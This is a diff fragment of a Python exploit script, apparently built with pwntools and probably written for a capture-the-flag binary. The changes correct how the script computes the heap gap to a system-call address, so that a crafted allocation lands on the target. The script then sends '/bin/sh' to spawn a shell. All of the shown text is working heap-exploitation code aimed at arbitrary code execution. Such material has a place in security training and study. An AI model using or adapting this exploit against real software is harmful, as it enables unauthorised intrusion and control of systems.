@@ -55,13 +55,13 @@ sysCallInt = int(sysCall, 16)
 
 # Calculating Next Chunk and gap
 mychunk = heapLeakInt+32    # due to small size, only should be a jump from the start of over chunk to next chunk
-gap = mychunk - sysCallInt  # Figure out distance between the next malloc to overwrite this piece
-jumpsize = gap -16   # want to padd way up to target instead of right onto it
+gap = sysCallInt - mychunk  # Figure out distance between the next malloc to overwrite this piece
+jumpsize = gap - 16   # want to padd way up to target instead of right onto it
 
 # Send line of jump size then send junk then create new chunk, should alloc right onto targer
 p.sendline(str(jumpsize))
 p.sendline(junk)
-p.sendline("32")
+p.sendline(b"32")
 
 # Pop a shell by using binsh
 p.sendline(b"/bin/sh\x00")
